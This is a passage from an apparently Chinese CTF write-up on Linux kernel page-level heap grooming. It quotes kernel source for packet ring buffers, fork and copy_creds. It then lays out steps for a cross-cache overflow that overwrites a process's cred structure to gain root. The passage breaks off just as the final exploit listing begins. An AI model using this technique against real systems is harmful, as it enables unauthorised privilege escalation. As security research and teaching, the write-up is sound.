tpacket_kbdq_core *p1 = GET_PBDQC_FROM_RB(rb);<br>struct tpacket_block_desc *pbd;<br><br>memset(p1, <span class="hljs-number">0</span>x0, sizeof(*p1));<br><br><span class="hljs-function"><span class="hljs-title">p1</span>-&gt;</span>knxt_seq_num = <span class="hljs-number">1</span>;<br><span class="hljs-function"><span class="hljs-title">p1</span>-&gt;</span>pkbdq = pg_vec;<br>pbd = (struct tpacket_block_desc *)pg_vec[<span class="hljs-number">0</span>].buffer;<br><span class="hljs-function"><span class="hljs-title">p1</span>-&gt;</span>pkblk_start= pg_vec[<span class="hljs-number">0</span>].buffer;<br><span class="hljs-function"><span class="hljs-title">p1</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">kblk_size</span> = req_u-&gt;</span>req3.tp_block_size;<br><span class="hljs-function"><span class="hljs-title">p1</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">knum_blocks</span>= req_u-&gt;</span>req3.tp_block_nr;<br><span class="hljs-function"><span class="hljs-title">p1</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">hdrlen</span> = po-&gt;</span>tp_hdrlen;<br><span class="hljs-function"><span class="hljs-title">p1</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">version</span> = po-&gt;</span>tp_version;<br><span class="hljs-function"><span class="hljs-title">p1</span>-&gt;</span>last_kactive_blk_num = <span class="hljs-number">0</span>;<br><span class="hljs-function"><span class="hljs-title">po</span>-&gt;</span>stats.stats3.tp_freeze_q_cnt = <span class="hljs-number">0</span>;<br><span class="hljs-function"><span class="hljs-title">if</span> (req_u-&gt;</span>req3.tp_retire_blk_tov)<br><span class="hljs-function"><span class="hljs-title">p1</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">retire_blk_tov</span> = req_u-&gt;</span>req3.tp_retire_blk_tov;<br><span class="hljs-keyword">else</span><br><span class="hljs-function"><span class="hljs-title">p1</span>-&gt;</span>retire_blk_tov = prb_calc_retire_blk_tmo(po,<br><span class="hljs-function"><span class="hljs-title">req_u</span>-&gt;</span>req3.tp_block_size);<br><span class="hljs-function"><span class="hljs-title">p1</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">tov_in_jiffies</span> = msecs_to_jiffies(p1-&gt;</span>retire_blk_tov);<br><span class="hljs-function"><span class="hljs-title">p1</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">blk_sizeof_priv</span> = req_u-&gt;</span>req3.tp_sizeof_priv;<br><span class="hljs-function"><span class="hljs-title">rwlock_init</span>(&amp;p1-&gt;</span>blk_fill_in_prog_lock);<br><br><span class="hljs-function"><span class="hljs-title">p1</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">max_frame_len</span> = p1-&gt;</span><span class="hljs-function"><span class="hljs-title">kblk_size</span> - BLK_PLUS_PRIV(p1-&gt;</span>blk_sizeof_priv);<br>prb_init_ft_ops(p1, req_u);<br>prb_setup_retire_blk_timer(po);<br>prb_open_block(p1, pbd);<br>&#125;<br></code></pre></td></tr></table></figure><p>而 <code>prb_open_block()</code>函数中实现的一个功能就是将 <code>struct tpacket_kbdq_core-&gt;nxt_offset</code>设置在每个块私有区域之后</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">static</span> void <span class="hljs-title function_ invoke__">prb_open_block</span>(<span class="hljs-keyword">struct</span> <span class="hljs-title class_">tpacket_kbdq_core</span> *pkc1,<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">tpacket_block_desc</span> *pbd1)<br>&#123;<br>...<br><br>pkc1<span class="hljs-punctuation">-&gt;</span>pkblk_start = (<span class="hljs-type">char</span> *)pbd1;<br>pkc1<span class="hljs-punctuation">-&gt;</span>nxt_offset = pkc1<span class="hljs-punctuation">-&gt;</span>pkblk_start + <span class="hljs-title function_ invoke__">BLK_PLUS_PRIV</span>(pkc1<span class="hljs-punctuation">-&gt;</span>blk_sizeof_priv);<br><br>...<br>&#125;<br></code></pre></td></tr></table></figure><hr><p>以上我们就得到了一个内核当中以页为单位的分配原语，这有利于我们进行页级的堆风水</p><p>值得注意的是，在BitsByWill师傅的博客中并没有完全采取当初p0团队的分配方式，其中不同的点就是该<a href="https://www.willsroot.io/2022/08/reviving-exploits-against-cred-struct.html">wp</a>当中使用的是 <code>TPACKET_V1/TPACKET_V2</code>，并且在创建 <code>ring buffer</code>的时候创建的是 <code>PACKET_TX_RING</code>类型的缓冲区，该缓冲区同 <code>PACKET_RX_RING</code>的区别在上面代码注释提了一嘴，但是这并不会影响我们的页分配，如下是我们 <code>packet_setsockopt()</code>部分源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">case</span> PACKET_RX_RING:<br><span class="hljs-keyword">case</span> PACKET_TX_RING:<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">tpacket_req_u</span> <span class="hljs-title">req_u</span>;</span><br><span class="hljs-type">int</span> len;<br><br>lock_sock(sk);<br><span class="hljs-keyword">switch</span> (po-&gt;tp_version) &#123;<br><span class="hljs-keyword">case</span> TPACKET_V1:<br><span class="hljs-keyword">case</span> TPACKET_V2:<br>len = <span class="hljs-keyword">sizeof</span>(req_u.req);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> TPACKET_V3:<br><span class="hljs-keyword">default</span>:<br>len = <span class="hljs-keyword">sizeof</span>(req_u.req3);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (optlen &lt; len) &#123;<br>ret = -EINVAL;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (copy_from_sockptr(&amp;req_u.req, optval, len))<br>ret = -EFAULT;<br><span class="hljs-keyword">else</span><br>ret = packet_set_ring(sk, &amp;req_u, <span class="hljs-number">0</span>,<br>    optname == PACKET_TX_RING);<br>&#125;<br>release_sock(sk);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到这俩区别在分配的时候不大，最后仍是调用了 <code>packet_set_ring</code>函数，后面的步骤在上面也已经讲解就不多说了</p><p>这里需要额外提一下，因为我们直接是调用到了page分配这层，因此我们提供的是 <code>order</code>，而这个order是由我们最开始传入的 <code>(struct tpacket_req_u)req_u-&gt;req-&gt;tp_block_size</code>来决定的，根据 <code>packet_setsockopt()</code>进行分析不难得出这一点</p><p>而我们如果说要释放掉我们分配的 <code>block_nr</code>个相应 <code>order</code>的block,只需要简单的关闭对应 <code>socket</code>的fd指针即可,但是这里仍然会存在一个问题</p><blockquote><p>The only issue is that default low privileged users can’t utilize these functions in the root namespace</p></blockquote><p>也就是说默认的低特权用户不能在root命名空间下用到上面这些函数，但我们通常可以在许多linux系统中创建自己的非特权用户命名空间。虽然说我们仍然可以通过大量堆喷某个数据结构来耗尽我们某个 <code>order</code>下free_list的block， 典型的例子就是常用的 <code>msg_msg</code>了，但他使用通用 <code>slab</code>进行分配不太可靠，最重要的是本题禁止用它了已经 :^(</p><h4 id="初步构造思路"><a href="#初步构造思路" class="headerlink" title="初步构造思路"></a>初步构造思路</h4><p>出题人给出了一个十分优雅的提权手法，那就是修改 <code>cred</code>,他的好处在于根本不用担心 <code>KASLR</code>,泄露地址，构造ROP链等等，我们都知道在现如今的版本， <code>cred</code>位于一个独立的 <code>kmem_cache</code>当中，名叫 <code>cred_jar</code>，我们可以首先耗尽该 <code>cred_jar</code>，因此未来他将使得分配器从伙伴系统 <code>order_0</code>处分配页面,并且将高阶 <code>order</code>的block进行拆解分配 ，这里我们需要free掉一部分，以免他们进行合并返回高阶 <code>order_*</code>，然后我们需要再次堆喷 <code>cred</code>,然后我们再次释放一些pages,之后再次堆喷攻击对象，并且至少要有一个攻击对象需要在 <code>cred</code>所在slab的正上方</p><p>那么该如何大量堆喷 <code>cred</code>结构体呢，我们只需要通过 <code>fork</code>大量创建子进程即可，虽说在 <code>fork</code>的过程中会产生大量噪音(分配过程中对其他无关对象的分配),但作者说这并不影响他们这个初始化堆喷的过程</p><h4 id="fork中噪声的处理"><a href="#fork中噪声的处理" class="headerlink" title="fork中噪声的处理"></a><code>fork</code>中噪声的处理</h4><p>在构造页级堆风水的过程当中，对于内存的分配十分严格，因此我们需要尽量减少噪声对于我们的干扰</p><p>在 <code>fork</code>的过程当中，最为核心的函数就是 <code>kernel_clone</code>,我们需要牢记这一点，如果我们在传统 <code>fork</code>调用的过程当中没有设置任何 <code>kernel_clone_args</code>的flag参数，那么就会出现以下步骤：</p><ol><li><p><code>kernel_clone_args()</code>函数调用 <code>copy_process()</code>函数</p></li><li><p><code>copy_process()</code>函数调用 <code>dup_task_truct()</code>函数，他将从目标内核系统中 <code>order_2</code>分配出一个 <code>task_struct</code>数据结构，然后 <code>dup_task_struct()</code> 调用 <code>alloc_thread_stack_node()</code>,如果说没有缓存栈可用的化，那么这个函数将使用 <code>__vmalloc_node_range</code>来分配一个虚拟连续的16kb区域来作为内核线程栈，这里通常会需要分配四个 <code>order_0</code>的pages</p></li><li><p>上面的 <code>vmalloc</code>将会分配一个 <code>kmalloc-64</code>的chunk来帮助建立vmalloc虚拟映射，然后，内核将会从 <code>vmap_area_cachep</code> 分配两个 <code>vmap_area</code> chunk。在这个系统和内核当中，第一个是从 <code>alloc_vmap_area</code>当中分配,第二个可能是从 <code>preload_this_cpu_lock</code>中分配</p></li><li><p>然后 <code>copy_process()</code>函数将会调用 <code>call_creds()</code>,他将会触发从 <code>prepare_creds()</code>中对于 <code>creds</code>的分配，这里如果设置了 <code>CLONE_THREAD</code>参数的化就不会发生这一步 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">copy_creds</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *p, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> clone_flags)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> *<span class="hljs-title">new</span>;</span><br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_KEYS_REQUEST_CACHE</span><br>p-&gt;cached_requested_key = <span class="hljs-literal">NULL</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-keyword">if</span> (<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_KEYS</span><br>!p-&gt;cred-&gt;thread_keyring &amp;&amp;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>clone_flags &amp; CLONE_THREAD<br>    ) &#123;<br>p-&gt;real_cred = get_cred(p-&gt;cred);<br>get_cred(p-&gt;cred);<br>alter_cred_subscribers(p-&gt;cred, <span class="hljs-number">2</span>);<br>kdebug(<span class="hljs-string">&quot;share_creds(%p&#123;%d,%d&#125;)&quot;</span>,<br>       p-&gt;cred, <span class="hljs-type">atomic_read</span>(&amp;p-&gt;cred-&gt;usage),<br>       read_cred_subscribers(p-&gt;cred));<br>inc_rlimit_ucounts(task_ucounts(p), UCOUNT_RLIMIT_NPROC, <span class="hljs-number">1</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>new = prepare_creds();<br><br>...<br><br></code></pre></td></tr></table></figure></li><li><p>在这之后 <code>copy_process()</code>函数开启了一系列 <code>copy_*()</code>函数，这个*是一系列进程所需要的资源，而这些函数便会触发内存的分配，除非设置了其各自的 <code>CLONE</code>标志，在平常的 <code>fork</code>当中，人们更希望从 <code>files_cache</code>,<code>fs_cache</code>,<code>sighand_cahe</code> 和 <code>signal_cache</code>当中分配新的chunk。其中最大的噪音是当没有设置 <code>CLONE_VM</code>标志位时建立<code>mm_struct</code>而产生的，而这反而会在 <code>vm_area_struct,anon_vma_chain</code>和 <code>anon_vma</code>等缓存当中触发大量内存分配活动，而这里所有分配都由该系统上的 <code>order_0</code>页面支持</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (retval)<br><span class="hljs-keyword">goto</span> bad_fork_cleanup_audit;<br>retval = copy_semundo(clone_flags, p);<br><span class="hljs-keyword">if</span> (retval)<br><span class="hljs-keyword">goto</span> bad_fork_cleanup_security;<br>retval = copy_files(clone_flags, p, args-&gt;no_files);<br><span class="hljs-keyword">if</span> (retval)<br><span class="hljs-keyword">goto</span> bad_fork_cleanup_semundo;<br>retval = copy_fs(clone_flags, p);<br><span class="hljs-keyword">if</span> (retval)<br><span class="hljs-keyword">goto</span> bad_fork_cleanup_files;<br>retval = copy_sighand(clone_flags, p);<br><span class="hljs-keyword">if</span> (retval)<br><span class="hljs-keyword">goto</span> bad_fork_cleanup_fs;<br>retval = copy_signal(clone_flags, p);<br><span class="hljs-keyword">if</span> (retval)<br><span class="hljs-keyword">goto</span> bad_fork_cleanup_sighand;<br>retval = copy_mm(clone_flags, p);<br><span class="hljs-keyword">if</span> (retval)<br><span class="hljs-keyword">goto</span> bad_fork_cleanup_signal;<br>retval = copy_namespaces(clone_flags, p);<br><span class="hljs-keyword">if</span> (retval)<br><span class="hljs-keyword">goto</span> bad_fork_cleanup_mm;<br>retval = copy_io(clone_flags, p);<br><span class="hljs-keyword">if</span> (retval)<br><span class="hljs-keyword">goto</span> bad_fork_cleanup_namespaces;<br>retval = copy_thread(p, args);<br><span class="hljs-keyword">if</span> (retval)<br><span class="hljs-keyword">goto</span> bad_fork_cleanup_io;<br><br></code></pre></td></tr></table></figure></li><li><p>最后，内核将分配出一个 pid chunk，其中所属的 <code>slab</code>也来自于 <code>order_0</code></p></li></ol><p>下面便是忽略vmalloc，仅仅专注于 <code>slab</code>分配的情况下，单一一个 <code>fork</code>调用在这个系统当中将会触发的分配</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c">task_struct<br>kmalloc<span class="hljs-number">-64</span><br>vmap_area<br>vmap_area<br>cred_jar<br>files_cache<br>fs_cache<br>sighand_cache<br>signal_cache<br>mm_struct<br>vm_area_struct<br>vm_area_struct<br>vm_area_struct<br>vm_area_struct<br>anon_vma_chain<br>anon_vma<br>anon_vma_chain<br>vm_area_struct<br>anon_vma_chain<br>anon_vma<br>anon_vma_chain<br>vm_area_struct<br>anon_vma_chain<br>anon_vma<br>anon_vma_chain<br>vm_area_struct<br>anon_vma_chain<br>anon_vma<br>anon_vma_chain<br>vm_area_struct<br>anon_vma_chain<br>anon_vma<br>anon_vma_chain<br>vm_area_struct<br>vm_area_struct<br>pid<br></code></pre></td></tr></table></figure><p>可以看到确实产生了很多噪音，在经过 <code>BitsByWill</code>师傅分析源码还有查看clone手册的努力下(bushi，使用以下的flag能极大的降低fork当中产生的噪音：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND<br></code></pre></td></tr></table></figure><p>当设置了这些flags之后，我们产生的噪音将会降低至下述情况</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">task_struct</span><br><span class="hljs-attribute">kmalloc</span>-<span class="hljs-number">64</span><br><span class="hljs-attribute">vmap_area</span><br><span class="hljs-attribute">vmap_area</span><br><span class="hljs-attribute">cred_jar</span><br><span class="hljs-attribute">signal_cache</span><br><span class="hljs-attribute">pid</span><br></code></pre></td></tr></table></figure><p>注意到这里仍然会由来自于 <code>vmalloc</code>的4个order_0的page。但这对于我们来说是可以接受的。这里还存在的问题是我们的子进程无法真正写入任何进程内存，因为它和父进程共享相同的虚拟内存，所以我们必须使用仅依赖于寄存器的shellcode来检查权限提升是否成功</p><h3 id="4-漏洞利用-2"><a href="#4-漏洞利用-2" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h3><p>经过上述一大堆知识的铺垫，现在开始考虑该漏洞的利用,以下是利用的概述</p><ol><li>利用 <code>packet_setsockopt()</code>函数来大量堆喷 <code>order_0</code>的block，并且在每两个分配的pages当中释放其中一个，这样一来我们就拥有了很多 <code>order_0</code>的对象，并且他不会合并到 <code>order_1</code>当中去。而我们最初的exploit是使用fork来开辟一个新的特权用户空间从而使得我们可以在其中使用这些页级分配原语</li><li>然后我们大量使用 <code>clone</code>，并且搭配上面说到的flag参数来分配我们的 <code>cred</code>objects,然后我们释放剩余的 <code>order_0</code>pages,然后我们再次大量堆喷我们的易受攻击的对象，这里会构造出一种我们的 <code>vuln objects</code>所在的page是刚好位于我们某个 <code>cred</code>page的上方</li></ol><h4 id="Step-I-前期准备"><a href="#Step-I-前期准备" class="headerlink" title="Step I: 前期准备"></a>Step I: 前期准备</h4><p>我们之前分析页级分配原语的时候已经说明，在root的命名空间下我们是无法使用该原语的，所以我们需要开辟一个子进程，然后利用 <code>unshare</code>系统调用来创建一个新的子命名空间并应用到子进程当中，这样我们能保证新创建的子进程是可以使用该页级分配系统原语的</p><p>而至于我们页级堆喷的方式，那就是使用管道，让父子进程之间通信，然后传递命令和结果，其中该子进程充当一个中间命令管理的作用</p><h4 id="Step-II-排干cred-jar"><a href="#Step-II-排干cred-jar" class="headerlink" title="Step II: 排干cred_jar"></a>Step II: 排干cred_jar</h4><p>这里排空他是为了后面我们可以调用fork 来从buddy system获取空页面，但这里的fork并不是fork函数，而是使用了更为精妙的 <code>clone</code>系统调用，他与fork函数的作用基本一致，但是他能实现更为细致的操作，就比如说分配标志的选则</p><h4 id="Step-III-堆喷大量page"><a href="#Step-III-堆喷大量page" class="headerlink" title="Step III: 堆喷大量page"></a>Step III: 堆喷大量page</h4><p>这里我们就可以利用之前创建的管理页级堆喷的子进程使用setsockopt来大量堆喷单页面，这里需要注意 <strong>我们需要提权的命名空间为原本的root命名空间，而我们创建的管理子进程是处于自己的命名空间的，所以我们之后堆喷的victim obj，也就是cred是需要在重新分配的子进程（若没经过设置，他同父进程一样处于root命名空间）当中，这样才可以真正修改某个子进程在root命名空间下的权限</strong>，这样我们就可以使得高order的页面均被拆分并且分配，然后我们，然后我们这里仅仅释放每两个页面中的后一页，这里为什么能够保证我们页面都是顺序分配的呢，那是因为我们从伙伴系统高阶拆分的页面在这里会是物理连续的，所以造成了我们基本上可以构造成下面这种情况</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/3ac79f3df8dcd100e7f3ed15348b4710b9122f92.jpg"></p><h4 id="Step-IV-分配victim-page"><a href="#Step-IV-分配victim-page" class="headerlink" title="Step IV: 分配victim page"></a>Step IV: 分配victim page</h4><p>这里的victim struct我们选则了上面讲到的 <code>struct cred</code>，这里我们只需要覆盖 <code>cred.usage</code>字段为1即可进行提权，这里是一个位于 <code>struct cred</code>的开头4字节的字段，满足我们溢出6字节的漏洞，</p><p>这里存在一定的噪声，也就是额外的4个 <code>order_0</code>页面</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/b812c8fcc3cec3fd996eb2419088d43f879427b5.jpg"></p><h4 id="Step-V-分配vulnerable-obj"><a href="#Step-V-分配vulnerable-obj" class="headerlink" title="Step V: 分配vulnerable obj"></a>Step V: 分配vulnerable obj</h4><p>也就是释放咱们上面的红色快，这里是为了分配之后咱们的<code>vulnerable ojbect</code>,情况如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/8326cffc1e178a8225966a94b003738da977e858.jpg"></p><p>这样就造成了我们的 <code>cross cache overflow</code>，然后我们在大量越界写的过程当中就会写入我们某个子进程 <code>cred</code>的头六个字节，四字节的1和二字节的0，这里两字节不多不少刚好覆盖原本的 <code>0x3E8</code></p><p>效果如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/ca1349540923dd546abeb25c9709b3de9c824830.jpg"></p><p>最终exp如下：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span 